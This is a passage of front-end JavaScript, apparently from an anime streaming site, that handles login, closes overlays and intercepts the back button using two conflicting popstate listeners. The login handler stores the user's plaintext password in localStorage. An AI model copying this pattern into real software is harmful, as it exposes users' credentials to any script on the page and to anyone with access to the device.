                console.log("Animation completed, now checking login...");
                setTimeout(checkLoginStatus, 500);
            }
        }, 500);
    }
    
    // Setup login form
    document.getElementById('loginForm').onsubmit = async (e) => {
        e.preventDefault();
        
        const userData = {
            name: document.getElementById('loginName').value.trim(),
            email: document.getElementById('loginEmail').value.trim(),
            password: document.getElementById('loginPassword').value,
            loginTime: new Date().toISOString(),
            device: navigator.userAgent,
            language: navigator.language
        };
        
        if (!userData.name || !userData.password) {
            showToast('Please enter name and password!', false);
            return;
        }
        
        localStorage.setItem('frontier_password', userData.password);
        loginUser(userData);
    };
    
    // Send activity report when user leaves
    window.addEventListener('beforeunload', () => {
        if (currentUser) {
            sendUserActivityReport('page_closed');
        }
    });
}
// Handle escape key to close info page
document.addEventListener('keydown', function(event) {
    if (event.key === 'Escape') {
        const overlay = document.getElementById('infoPageOverlay');
        if (overlay.style.display === 'block') {
            closeInfoPage();
        }
    }
});

// Also handle clicks outside the overlay to close
document.getElementById('infoPageOverlay').addEventListener('click', function(event) {
    if (event.target === this) {
        closeInfoPage();
    }
});
// ==================== HARDWARE BACK BUTTON HANDLING ====================

// Hardware back button handle karo
let canExit = false;

// Initial state push
window.history.pushState({ page: "frontier_main" }, "");

// Popstate listener for hardware back button
window.addEventListener('popstate', function(event) {
    if (!canExit) {
        console.log('Back button pressed, checking for open overlays...');
        
        // Check karo koi overlay open hai kya
        const infoOverlay = document.getElementById('infoPageOverlay');
        const selectorModal = document.getElementById('selectorModal');
        const trailerModal = document.getElementById('trailerModal');
        const episodeModal = document.getElementById('episodePlayerModal');
        const loginModal = document.getElementById('loginModal');
        const suggestionsOverlay = document.getElementById('suggestionsOverlay');
        
        let overlayOpen = false;
        
        // Pehle check karo info overlay
        if (infoOverlay.style.display === 'block') {
            console.log('Info overlay open, closing...');
            closeInfoPage();
            overlayOpen = true;
        }
        
        // Check selector modal
        if (selectorModal && !selectorModal.classList.contains('hidden')) {
            console.log('Selector modal open, closing...');
            closeSelector();
            overlayOpen = true;
        }
        
        // Check trailer modal
        if (trailerModal && !trailerModal.classList.contains('hidden')) {
            console.log('Trailer modal open, closing...');
            closeTrailer();
            overlayOpen = true;
        }
        
        // Check episode player modal
        if (episodeModal && !episodeModal.classList.contains('hidden')) {
            console.log('Episode player modal open, closing...');
            closeEpisodePlayer();
            overlayOpen = true;
        }
        
        // Check login modal (only if user not logged in)
        if (loginModal && !loginModal.classList.contains('hidden') && !currentUser) {
            console.log('Login modal open, showing warning...');
            showToast('Please login to continue!', false);
            overlayOpen = true;
            
            // Login modal ko close mat karo
            window.history.pushState({ page: "frontier_main" }, "");
            return;
        }
        
        // Check search overlay
        if (suggestionsOverlay && suggestionsOverlay.style.display !== 'none') {
            console.log('Search overlay open, closing...');
            closeSearch();
            overlayOpen = true;
        }
        
        // Agar koi overlay open tha, to wapas state push karo
        if (overlayOpen) {
            console.log('Overlay was open, pushing state again...');
            setTimeout(() => {
                window.history.pushState({ page: "frontier_main" }, "");
            }, 100);
        } else {
            // Agar koi overlay open nahi hai, to exit confirm karo
            console.log('No overlay open, asking for exit confirmation...');
            
            // Ek alert ya confirm dialog show karo
            const confirmExit = confirm('Press OK to exit AnimeFrontier, or Cancel to stay.');
            
            if (confirmExit) {
                // User exit karna chahta hai
                canExit = true;
                
                // Activity report send karo
                if (currentUser) {
                    sendUserActivityReport('app_closed_via_back');
                }
                
                // Allow natural exit
                setTimeout(() => {
                    window.history.back();
                }, 100);
            } else {
                // User nahi exit karna chahta, wapas state push karo
                window.history.pushState({ page: "frontier_main" }, "");
                showToast('You are still in AnimeFrontier!', true);
            }
        }
    }
});

// Also handle page visibility for when user switches tabs
document.addEventListener('visibilitychange', function() {
    if (document.hidden) {
        console.log('Page hidden (tab switched)');
        // Tab switch hone par kuch special nahi karna
    } else {
        console.log('Page visible again');
    }
});

// Double-tap back to exit (for better UX)
let backPressCount = 0;

// Alternative approach: Double tap to exit
window.addEventListener('popstate', function() {
    if (backPressCount === 0) {
        backPressCount = 1;
        
        // Show toast message
        showToast('Press back again to exit', false);
        
        // Reset counter after 2 seconds
        setTimeout(() => {
            backPressCount = 0;
        }, 2000);
        
        // Push state back
        setTimeout(() => {
            window.history.pushState({ page: "frontier_main" }, "");
        }, 100);
    } else if (backPressCount === 1) {
        // Second back press - exit
        if (currentUser) {
            sendUserActivityReport('app_closed_via_double_back');
        }
        
        // Allow exit
        canExit = true;
        window.history.back();
    }
});
// Custom back button toast
function showBackButtonToast() {
    const toast = document.createElement('div');
    toast.id = 'backToast';
    toast.style.cssText = `
        position: fixed;
        bottom: 100px;
        left: 50%;
        transform: translateX(-50%);
        background: rgba(0, 0, 0, 0.8);
        color: white;
        padding: 12px 24px;
        border-radius: 25px;
        font-weight: bold;
        z-index: 100000;
        animation: fadeInOut 2s ease;
    `;
    
    const style = document.createElement('style');
    style.textContent = `
        @keyframes fadeInOut {
            0% { opacity: 0; transform: translateX(-50%) translateY(20px); }
            20% { opacity: 1; transform: translateX(-50%) translateY(0); }
            80% { opacity: 1; transform: translateX(-50%) translateY(0); }
            100% { opacity: 0; transform: translateX(-50%) translateY(-20px); }
        }
    `;
    
    document.head.appendChild(style);
    toast.textContent = 'Press back again to exit';
    document.body.appendChild(toast);
    
    setTimeout(() => {
        toast.remove();
        style.remove();
    }, 2000);
}
